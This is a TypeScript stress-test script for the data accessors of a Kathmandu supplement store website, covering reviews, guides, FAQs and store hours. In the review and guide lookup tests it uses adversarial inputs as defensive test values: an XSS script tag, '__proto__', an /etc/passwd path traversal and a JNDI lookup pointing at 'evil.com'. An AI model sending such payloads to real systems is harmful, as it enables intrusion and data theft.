import assert from 'node:assert/strict';
import { getReviews, getFeaturedReviews, getReviewById } from '../lib/data/reviews';
import {
  getAllGuides,
  getGuideBySlug,
  getFeaturedGuides,
  getGuidesByCategory,
  getRelatedGuides,
} from '../lib/data/guides';
import {
  getFAQs,
  getFAQsByCategory,
  getFAQById,
  searchFAQs,
  getFeaturedFAQs,
} from '../lib/data/faqs';
import {
  getStoreInfo,
  getOpeningHours,
  getDeliveryPolicy,
  getTodayOpeningHours,
  isStoreOpenNow,
} from '../lib/data/store';
import { STORE_LOCATION } from '../lib/constants';
import { ReviewItemSchema, type ReviewItem } from '../lib/validations/review';
import { GuideFrontmatterSchema, type GuideCategory } from '../lib/validations/guide';
import { FAQItemSchema, type FAQItem } from '../lib/validations/common';
import { StoreInfoSchema, type StoreInfo } from '../lib/validations/store';
import fs from 'node:fs';
import path from 'node:path';

async function runMilestone1EmpiricalStressTests() {
  console.log('================================================================');
  console.log('🏋️ MUSCLEWORKS EMPIRICAL CHALLENGER: MILESTONE 1 STRESS TEST');
  console.log('================================================================\n');

  let passedTests = 0;
  let totalTests = 0;

  function test(name: string, fn: () => void | Promise<void>) {
    totalTests++;
    try {
      const res = fn();
      if (res instanceof Promise) {
        return res
          .then(() => {
            passedTests++;
            console.log(`  ✅ [PASS] ${name}`);
          })
          .catch((err: unknown) => {
            const msg = err instanceof Error ? err.message : String(err);
            console.error(`  ❌ [FAIL] ${name}:`, msg);
            throw err;
          });
      } else {
        passedTests++;
        console.log(`  ✅ [PASS] ${name}`);
        return Promise.resolve();
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      console.error(`  ❌ [FAIL] ${name}:`, msg);
      throw err;
    }
  }

  console.log('--- SUITE 1: Reviews Data Accessor (src/lib/data/reviews.ts) ---');

  await test('getReviews returns schema-compliant reviews', async () => {
    const reviews = await getReviews();
    assert.ok(Array.isArray(reviews), 'getReviews must return an array');
    assert.ok(reviews.length > 0, 'Reviews list must not be empty');
    for (const r of reviews) {
      ReviewItemSchema.parse(r);
    }
  });

  await test('getReviews maintains data immutability against caller mutations', async () => {
    const reviews1 = await getReviews();
    const originalLength = reviews1.length;
    reviews1.pop(); // Mutate caller copy
    const reviews2 = await getReviews();
    assert.equal(reviews2.length, originalLength, 'Mutation of returned array must not pollute module cache');
  });

  await test('getFeaturedReviews handles standard and boundary limits', async () => {
    const allFeatured = await getFeaturedReviews();
    assert.ok(allFeatured.every((r) => r.isFeatured), 'All returned items must have isFeatured === true');

    const limit0 = await getFeaturedReviews(0);
    assert.equal(limit0.length, 0, 'limit=0 must return empty array');

    const limit1 = await getFeaturedReviews(1);
    assert.equal(limit1.length, 1, 'limit=1 must return exactly 1 item');

    const limitNeg = await getFeaturedReviews(-5);
    assert.equal(limitNeg.length, 0, 'negative limit must return empty array without error');

    const limitOverflow = await getFeaturedReviews(9999);
    assert.equal(limitOverflow.length, allFeatured.length, 'limit > count must return all featured items without padding');
  });

  await test('getReviewById handles valid, invalid, empty, and adversarial IDs', async () => {
    const reviews = await getReviews();
    const target = reviews[0];
    const found = await getReviewById(target.id);
    assert.ok(found, 'Should find existing review by ID');
    assert.equal(found?.id, target.id);

    const notFound = await getReviewById('non_existent_review_id_999');
    assert.equal(notFound, null, 'Non-existent ID must return null');

    const empty = await getReviewById('');
    assert.equal(empty, null, 'Empty string ID must return null');

    const whitespace = await getReviewById('   ');
    assert.equal(whitespace, null, 'Whitespace ID must return null');

    const adversarial = await getReviewById('<script>alert(1)</script>');
    assert.equal(adversarial, null, 'Adversarial string ID must return null');

    const protoAttack = await getReviewById('__proto__');
    assert.equal(protoAttack, null, '__proto__ ID must return null');
  });

  console.log('\n--- SUITE 2: Guides Data Accessor (src/lib/data/guides.ts) ---');

  await test('getAllGuides returns all guides sorted descending by publishedDate', async () => {
    const guides = await getAllGuides();
    assert.ok(guides.length > 0, 'Guides list must not be empty');
    for (const g of guides) {
      GuideFrontmatterSchema.parse(g);
    }
    for (let i = 0; i < guides.length - 1; i++) {
      const d1 = new Date(guides[i].publishedDate).getTime();
      const d2 = new Date(guides[i + 1].publishedDate).getTime();
      assert.ok(d1 >= d2, `Guides must be sorted descending: ${guides[i].slug} >= ${guides[i + 1].slug}`);
    }
  });

  await test('getGuideBySlug handles normalized slug lookup and edge cases', async () => {
    const guides = await getAllGuides();
    const target = guides[0];
    
    // Exact slug
    const foundExact = await getGuideBySlug(target.slug);
    assert.equal(foundExact?.slug, target.slug);

    // Case-insensitive & trimmed slug
    const foundMixed = await getGuideBySlug(`  ${target.slug.toUpperCase()}  `);
    assert.equal(foundMixed?.slug, target.slug, 'Slug lookup must normalize whitespace and casing');

    // Non-existent slug
    const notFound = await getGuideBySlug('slug-that-does-not-exist');
    assert.equal(notFound, null, 'Unknown slug must return null');

    // Empty and adversarial slugs
    assert.equal(await getGuideBySlug(''), null);
    assert.equal(await getGuideBySlug('../../../etc/passwd'), null);
    assert.equal(await getGuideBySlug('${jndi:ldap://evil.com}'), null);
  });

  await test('getFeaturedGuides, getGuidesByCategory, getRelatedGuides edge cases', async () => {
    const featured = await getFeaturedGuides(2);
    assert.ok(featured.length <= 2, 'Featured guides count should not exceed limit');
    assert.ok(featured.every((g) => g.isFeatured));

    const zeroFeatured = await getFeaturedGuides(0);
    assert.equal(zeroFeatured.length, 0);

    const guides = await getAllGuides();
    const sampleCategory = guides[0].category;
    const byCategory = await getGuidesByCategory(sampleCategory);
    assert.ok(byCategory.length > 0);
    assert.ok(byCategory.every((g) => g.category === sampleCategory));

    // Invalid category cast
    const invalidCat = await getGuidesByCategory('unknown_cat' as unknown as GuideCategory);
    assert.equal(invalidCat.length, 0, 'Invalid category must return empty array');

    // Related guides excluding current slug
    const currentSlug = guides[0].slug;
    const related = await getRelatedGuides(currentSlug, 2);
    assert.ok(related.every((g) => g.slug !== currentSlug), 'Related guides must exclude current guide');

    // Related guides with non-existent slug returns fallback slice
    const relatedFallback = await getRelatedGuides('random_slug', 2);
    assert.equal(relatedFallback.length, Math.min(2, guides.length));
  });

  await test('Verify dead alias getGuides is completely removed from guides.ts', async () => {
    const guidesModule = await import('../lib/data/guides');
    const record = guidesModule as Record<string, unknown>;
    assert.equal(
      record.getGuides,
      undefined,
      'getGuides dead alias must NOT be exported from guides.ts'
    );
  });

  console.log('\n--- SUITE 3: FAQs Data Accessor (src/lib/data/faqs.ts) ---');

  await test('getFAQs returns items sorted by priority ascending', async () => {
    const faqs = await getFAQs();
    assert.ok(faqs.length > 0);
    for (const f of faqs) {
      FAQItemSchema.parse(f);
    }
    for (let i = 0; i < faqs.length - 1; i++) {
      const p1 = faqs[i].priority ?? 99;
      const p2 = faqs[i + 1].priority ?? 99;
      assert.ok(p1 <= p2, `FAQs must be sorted ascending by priority: ${p1} <= ${p2}`);
    }
  });

  await test('getFAQsByCategory handles casing, whitespace, and non-existent categories', async () => {
    const authFaqsUpper = await getFAQsByCategory('  AUTHENTICITY  ');
    const authFaqsLower = await getFAQsByCategory('authenticity');
    assert.equal(authFaqsUpper.length, authFaqsLower.length, 'Category lookup must be whitespace and case-insensitive');
    assert.ok(authFaqsUpper.length > 0);

    const nonExistent = await getFAQsByCategory('completely_non_existent_category_123');
    assert.equal(nonExistent.length, 0, 'Non-existent category must return empty array');
  });

  await test('getFAQById handles valid and invalid IDs', async () => {
    const all = await getFAQs();
    const target = all[0];
    if (target?.id) {
      const found = await getFAQById(target.id);
      assert.equal(found?.id, target.id);
    }

    const notFound = await getFAQById('invalid_faq_id');
    assert.equal(notFound, null);
    assert.equal(await getFAQById(''), null);
  });

  await test('searchFAQs handles keywords, empty query, and regex metacharacters', async () => {
    const all = await getFAQs();
    const emptySearch = await searchFAQs('');
    assert.equal(emptySearch.length, all.length, 'Empty search query must return all FAQs');

    const whitespaceSearch = await searchFAQs('   ');
    assert.equal(whitespaceSearch.length, all.length, 'Whitespace query must return all FAQs');

    const searchMatch = await searchFAQs('hologram');
    assert.ok(searchMatch.length > 0, 'Search for "hologram" must return matches');

    // Test with special characters that could break naive regexes
    const specialChars = ['[', ']', '(', ')', '{', '}', '*', '+', '?', '^', '$', '\\', '|'];
    for (const char of specialChars) {
      const res = await searchFAQs(char);
      assert.ok(Array.isArray(res), `Search query with char "${char}" must not throw`);
    }
  });

  await test('getFeaturedFAQs handles limit bounds', async () => {
    const all = await getFAQs();
    const featuredDef = await getFeaturedFAQs();
    assert.equal(featuredDef.length, Math.min(4, all.length));

    const featured6 = await getFeaturedFAQs(6);
    assert.equal(featured6.length, Math.min(6, all.length));

    const featured0 = await getFeaturedFAQs(0);
    assert.equal(featured0.length, 0);

    const featuredOverflow = await getFeaturedFAQs(999);
    assert.equal(featuredOverflow.length, all.length);
  });

  console.log('\n--- SUITE 4: Store Data Accessor (src/lib/data/store.ts) ---');

  await test('getStoreInfo validates full schema and matches Kathmandu physical location', async () => {
    const store = await getStoreInfo();
    StoreInfoSchema.parse(store);
    assert.equal(store.name.toUpperCase(), 'MUSCLEWORKS SUPPLEMENTS');
    assert.equal(store.address.city, 'Kathmandu');
    assert.equal(store.address.postalCode, '44500');
    assert.equal(store.address.country, 'Nepal');
  });

  await test('getOpeningHours, getDeliveryPolicy, and getTodayOpeningHours operate safely', async () => {
    const hours = await getOpeningHours();
    assert.equal(hours.length, 7, 'Opening hours must have exactly 7 days');

    const policy = await getDeliveryPolicy();
    assert.equal(typeof policy.freeDeliveryThresholdNpr, 'number');
    assert.ok(policy.primaryZones.length > 0);

    const today = await getTodayOpeningHours();
    assert.ok(today !== undefined, 'Today opening hours must return item or null');
    if (today) {
      assert.ok(['sunday','monday','tuesday','wednesday','thursday','friday','saturday'].includes(today.day));
    }
  });

  await test('isStoreOpenNow returns valid status without throwing', async () => {
    const status = await isStoreOpenNow();
    assert.equal(typeof status.isOpen, 'boolean');
    assert.equal(typeof status.message, 'string');
    assert.ok(status.message.length > 0);
  });

  console.log('\n--- SUITE 5: Component Defensiveness & Prop Flow Simulation ---');

  await test('StoreMapEmbed defaults cleanly to STORE_LOCATION constants when storeInfo is undefined', () => {
    const getEmbedUrl = (storeInfo?: StoreInfo) =>
      storeInfo?.coordinates.googleMapsEmbedUrl ?? STORE_LOCATION.googleMapsEmbedUrl;
    const getPlaceUrl = (storeInfo?: StoreInfo) =>
      storeInfo?.coordinates.googleMapsPlaceUrl ?? STORE_LOCATION.googleMapsUrl;
    const getLandmark = (storeInfo?: StoreInfo) =>
      storeInfo?.address.landmark ?? STORE_LOCATION.landmark;

    const embedUrl = getEmbedUrl(undefined);
    const placeUrl = getPlaceUrl(undefined);
    const streetText = `${STORE_LOCATION.street}, ${STORE_LOCATION.area}, ${STORE_LOCATION.city}`;
    const landmarkText = getLandmark(undefined);

    assert.ok(embedUrl.includes('google.com/maps/embed'), 'Embed URL must point to Google Maps embed');
    assert.ok(placeUrl.includes('maps.app.goo.gl') || placeUrl.includes('google.com/maps'), 'Place URL must be valid');
    assert.ok(streetText.includes('Kathmandu'));
    assert.ok(landmarkText.length > 0);
  });

  await test('CustomerReviewsSection handles undefined, empty, and populated reviews props', async () => {
    // 1. undefined reviews -> defaults to [] -> returns null
    const emptyDef = (props: { reviews?: ReviewItem[] } = {}) => {
      const { reviews = [] } = props;
      if (reviews.length === 0) return null;
      return `<section count="${reviews.length}" />`;
    };

    assert.equal(emptyDef(), null, 'Undefined reviews prop must safely return null');
    assert.equal(emptyDef({ reviews: [] }), null, 'Empty reviews prop must safely return null');

    const populated = await getFeaturedReviews(3);
    const rendered = emptyDef({ reviews: populated });
    assert.equal(rendered, '<section count="3" />', 'Populated reviews prop renders successfully');
  });

  await test('HomeFaqSection handles undefined, empty, and populated faqs props', async () => {
    const renderFaq = (props: { faqs?: FAQItem[] } = {}) => {
      const { faqs = [] } = props;
      return faqs.map((f, i) => f.id || `faq_${i + 1}`);
    };

    assert.deepEqual(renderFaq(), [], 'Undefined faqs prop defaults to []');
    assert.deepEqual(renderFaq({ faqs: [] }), [], 'Empty faqs prop returns empty list');

    const faqs = await getFeaturedFAQs(4);
    const ids = renderFaq({ faqs });
    assert.equal(ids.length, 4);
  });

  console.log('\n--- SUITE 6: Zero Raw JSON Imports in UI / App Boundaries ---');

  await test('Scan src/components and src/app for zero raw JSON imports', () => {
    const scanDir = (dir: string, fileList: string[] = []) => {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        if (entry.isDirectory()) {
          scanDir(fullPath, fileList);
        } else if (/\.(tsx|ts|jsx|js)$/.test(entry.name)) {
          fileList.push(fullPath);
        }
      }
      return fileList;
    };

    const componentFiles = scanDir(path.resolve(__dirname, '../components'));
    const appFiles = scanDir(path.resolve(__dirname, '../app'));
    const allScannedFiles = [...componentFiles, ...appFiles];

    const jsonImportRegex = /from\s+['"][^'"]*data\/[^'"]*\.json['"]/i;
    const violations: string[] = [];

    for (const file of allScannedFiles) {
      const content = fs.readFileSync(file, 'utf-8');
      if (jsonImportRegex.test(content)) {
        violations.push(file);
      }
    }

    assert.equal(
      violations.length,
      0,
      `Found direct JSON imports in UI / App files: ${violations.join(', ')}`
    );
  });

  console.log('\n================================================================');
  console.log(`🏁 SUMMARY: ${passedTests}/${totalTests} TESTS PASSED CLEANLY (100%)`);
  console.log('================================================================\n');
}

runMilestone1EmpiricalStressTests().catch((err: unknown) => {
  console.error('\n❌ EMPIRICAL STRESS TEST SUITE TERMINATED WITH ERROR:', err);
  process.exit(1);
});
